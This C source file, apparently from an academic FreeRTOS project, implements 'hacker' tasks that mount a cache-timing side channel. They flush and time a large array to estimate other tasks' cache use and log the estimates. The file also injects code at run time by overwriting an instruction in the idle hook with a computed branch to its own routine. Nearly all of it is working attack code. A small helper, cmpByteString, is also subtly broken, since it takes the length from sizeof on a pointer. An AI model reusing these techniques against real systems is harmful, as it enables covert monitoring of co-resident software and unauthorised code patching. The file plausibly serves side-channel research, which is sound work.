/*
 * HackerTasks.c
 *
 *  Created on: Mar 12, 2015
 *      Author: CY
 */

#include "HackerTasks.h"

/* For recording log. */
//#include "LogUtility/AppLogUtility.h"
#include "LogUtility/HackerLogUtility.h"

/* Attack function includes. */
#include "CacheAttackFunction.h"

/* For hackerQueue passing information between hacker tasks. */
#include "queue.h"

u32 hackerArray[SIZE_OF_HACKER_ARRAY];	// Too big to fit the stack size limit of a FreeRTOS task.

/* The queue for passing information from low to high hacker. */
QueueHandle_t hackerQueue = NULL;
u32 validIntervalFound;
u32 highHackerJustFinished;


void prvLowHackerTask( void *pvParameters )
{
	u32 u32LowHackerTimerStart;
	u32 u32LowHackerTimerEnd;
	u32 u32TempLowHackerTimer;
	u32 u32LowHackerTimerDiff;


	u32 u32HackerQueueData = 0;

	u32LowHackerTimerStart = GET_GTIMER_LOWER;

	while (1) {

		u32LowHackerTimerEnd = GET_GTIMER_LOWER;

		if (u32LowHackerTimerEnd >= u32LowHackerTimerStart){
			u32LowHackerTimerDiff = u32LowHackerTimerEnd - u32LowHackerTimerStart;
		} else {
			u32LowHackerTimerDiff = ((u32)(-1)) - u32LowHackerTimerStart + u32LowHackerTimerEnd;
		}

//		xil_printf("\t%d", u32LowHackerTimerDiff);
		//taskENTER_CRITICAL();
		//feedLog(ENUM_LOG_OBSERVER_HACKER, u32LowHackerTimerDiff, "");
		feedHackerLog(getTaskId(), u32LowHackerTimerDiff, "L");
		//taskEXIT_CRITICAL();

		/* If measured period is bigger than 1ms (it's original period), then it is a legitimate hacking period. */
		if (u32LowHackerTimerDiff >= 700000)//350000)
		{
			// Inform high hacker task
			u32HackerQueueData = u32LowHackerTimerDiff;
			if ( xQueueSend( hackerQueue, &u32HackerQueueData, ( TickType_t ) 0 ))	// Send the value to queue.
			{
				u32LowHackerTimerStart = u32LowHackerTimerEnd;
			}
			else
			{
				u32LowHackerTimerStart = u32LowHackerTimerEnd;
			}
		}

		u32LowHackerTimerStart = u32LowHackerTimerEnd;

		vTaskDelay( LOW_HACKER_TASK_DELAY_TIME_MS );
	}
}

/* Compare strings without '\0'. */
/* memcmp is also available in main.c provided by FreeRTOS. */
int cmpByteString(char *inPtrBegin, char *inString)
{
	u32 loop;
	char *strPtr1 = inPtrBegin;
	char *strPtr2 = inString;
	u32 strLength = sizeof(inString);

	/* Check string byte by byte within the input string length. */
	for (loop=0; loop<strLength; loop++, strPtr1++, strPtr2++)
	{
		if (*strPtr1 != *strPtr2)
		{ // If the character is unequal, then return false.
			return FALSE;
		}
	}

	// After checking every byte, two strings are equal, thus return true.
	return TRUE;
}


/*****************************************************************************/
/**
* A FreeRTOS task function
* Keep monitoring the cache utilization of other tasks by measuring the time
* difference of accessing cache caused by cache hit and cache miss.
*
* @param	None
*
* @return	None
*
* @note		None.
*
******************************************************************************/
//u32 hackerArray[SIZE_OF_HACKER_ARRAY];	// Too big to fit the stack size limit of a FreeRTOS task.
void prvHackerTask( void *pvParameters ){
	//char strTaskName[10];
	TickType_t xLastWakeTime;
	u32 u32TimeDiff;
	u32 u32MissEstimation;
	u32 u32ArrayMissEstimation[HACKER_TASK_AVERAGE_TIMES];
	u32 u32ArrayCounter = 0;
	u32 u32SumOfMissEstimation = 0;
	//u32 u32EventCounter0, u32EventCounter1;
	u32 u32Loop = 0;

	u32 u32HackerQueueReceivedData = 0;

	u32 alwaysFalse = FALSE;
	u32 *hackerPointerSource, *hackerPointerDest;

	// This is for getting the address of the function where our code is going to be injected.
	extern void vApplicationIdleHook(void);

	/* Inject jump command in the idle task. */
	hackerPointerSource = &vApplicationIdleHook + 12;	// Offset 12 to target the bl instruction.
	hackerPointerDest = &idleInjection;
	*hackerPointerSource = 0xEB000000 | ((((long)hackerPointerDest - (long)hackerPointerSource - 8)/4)&0xFFFFFF);
	// Instruction format: 0x EB (bl instruction) + FF FF FF (offset address)

	validIntervalFound = FALSE;
	highHackerJustFinished = FALSE;

	/* Create hacker's queue. */
	hackerQueue = xQueueCreate( HACKER_QUEUE_LENGTH, sizeof( uint32_t ) );

	/* Initialize the u32ArrayMissEstimation array */
	for (u32Loop=0; u32Loop<HACKER_TASK_AVERAGE_TIMES; u32Loop++) {
		u32ArrayMissEstimation[u32Loop] = 0;
	}

	/* Fill the cache. */
	//taskENTER_CRITICAL();
	vDataCacheFlush();
	getTimeLoadIntArrayRange(hackerArray, SIZE_OF_HACKER_ARRAY);
	//taskEXIT_CRITICAL();

	xLastWakeTime = xTaskGetTickCount();
	while (1){
		vTaskDelayUntil( &xLastWakeTime, HACKER_TASK_DELAY_TIME_MS );
	//	taskENTER_CRITICAL();
		//getTaskName(strTaskName);
	//	taskEXIT_CRITICAL();
		//xil_printf("%s, %d\r\n", strTaskName, getTaskId());
		//vParTestToggleLED(0);

		//taskENTER_CRITICAL();
		u32HackerQueueReceivedData = 0;
		//if (xQueueReceive( hackerQueue, &u32HackerQueueReceivedData, ( TickType_t ) 0  ))
		if (validIntervalFound == TRUE)
		{
			;//u32HackerQueueReceivedData = 0;
			validIntervalFound = FALSE;
		}
		else
		{
			continue;//u32HackerQueueReceivedData = 0;
		}
//		if (u32HackerQueueReceivedData == 0)
//		{
//			continue;
//		}


		// Start L2 event counter.
		//getTimeLoadLineIntArrayRange(hackerArray, LINE_OF_HACKER_ARRAY);
//		XL2cc_EventCtrStart();

		//u32TimeDiff = getTimeLoadIntArrayRange(hackerArray, SIZE_OF_HACKER_ARRAY);
		u32TimeDiff = getTimeLoadLineIntArrayRange(hackerArray, LINE_OF_HACKER_ARRAY);

		// Stop and get the event counter values.
//		XL2cc_EventCtrStop(&u32EventCounter0, &u32EventCounter1);
		//xil_printf("\t#Hit=%d,Req=%d", u32EventCounter0, u32EventCounter1);
//		xil_printf("\r\n( %d\t%d )", u32EventCounter0, u32EventCounter1);

		// H+M=512000/32 lines = 16000 lines
		// H = 16000 - M
		// Ch*H + Cm*M = u32TimeDiff
		// 50*H + 77*M = u32TimeDiff
		// Thus, 50*(16000-M) + 77*M = u32TimeDiff
		//       27M = u32TimeDiff - 50*16000
		//	       M = u32TimeDiff/27 - 22500
		u32MissEstimation = (u32TimeDiff/(C_M_LINE-C_H_LINE)) - C_H_LINE*LINE_OF_HACKER_ARRAY/(C_M_LINE-C_H_LINE);

		u32ArrayMissEstimation[u32ArrayCounter] = u32MissEstimation;

		u32ArrayCounter++;
		if (u32ArrayCounter >= HACKER_TASK_AVERAGE_TIMES)
			u32ArrayCounter = 0;

		u32SumOfMissEstimation = 0;
		for (u32Loop=0; u32Loop<HACKER_TASK_AVERAGE_TIMES; u32Loop++) {
			u32SumOfMissEstimation += u32ArrayMissEstimation[u32Loop];
		}
		u32SumOfMissEstimation = u32SumOfMissEstimation/HACKER_TASK_AVERAGE_TIMES;


		//xil_printf("\t%d : %d", u32TimeDiff, u32MissEstimation<<5);
		//xil_printf("\t( %d\t %d )", u32TimeDiff, u32MissEstimation);
		//xil_printf("\t( %d\t %d )", u32TimeDiff, u32SumOfMissEstimation);
//		xil_printf("\r\n%d", u32SumOfMissEstimation);
		//taskENTER_CRITICAL();
		//feedLog(ENUM_LOG_HIGH_HACKER, u32SumOfMissEstimation, "");
		feedHackerLog(getTaskId(), u32SumOfMissEstimation, "H");
		//taskEXIT_CRITICAL();
		// [cycles of 512kB miss] - u32TimeDiff = [time of X-Byte hit]
		// [time of X-Byte hit] / [time of 1-Byte hit] = [Y-Byte used by others]


		vDataCacheFlush();
		getTimeLoadLineIntArrayRange(hackerArray, LINE_OF_HACKER_ARRAY);

		//taskEXIT_CRITICAL();
		//vTaskDelay( HACKER_TASK_DELAY_TIME_MS );

		highHackerJustFinished = TRUE;
	}
}


void idleInjection(void)
{
//	feedHackerLog(getTaskId(), 0, "INJECT");
//	return;

	static u32 u32LowHackerTimerStart;
	static u32 u32LowHackerTimerEnd;
	u32 u32LowHackerTimerDiff;
	u32 u32HackerQueueData = 0;

	static u32 firstTime = TRUE;

	if (firstTime == TRUE)
	{
		u32LowHackerTimerStart = GET_GTIMER_LOWER;
		firstTime = FALSE;
		return;
	}

	u32LowHackerTimerEnd = GET_GTIMER_LOWER;

	if (u32LowHackerTimerEnd >= u32LowHackerTimerStart){
		u32LowHackerTimerDiff = u32LowHackerTimerEnd - u32LowHackerTimerStart;
	} else {
		u32LowHackerTimerDiff = ((u32)(-1)) - u32LowHackerTimerStart + u32LowHackerTimerEnd;
	}

//	feedHackerLog(0, u32LowHackerTimerDiff, "INJ");

	/* If measured period is bigger than 1ms (it's original period), then it is a legitimate hacking period. */
	if (u32LowHackerTimerDiff >= 100000)//700000)//350000)
	{
		if (highHackerJustFinished == TRUE)
		{
			highHackerJustFinished = FALSE;
		}
		else
		{
			// Inform high hacker task
			u32HackerQueueData = u32LowHackerTimerDiff;
	//		xQueueSend( hackerQueue, &u32HackerQueueData, ( TickType_t ) 0 );	// Send the value to queue.
			validIntervalFound = TRUE;
		}
	}
	else
	{
		u32HackerQueueData = 1;
	}

	u32LowHackerTimerStart = u32LowHackerTimerEnd;
	return;


}
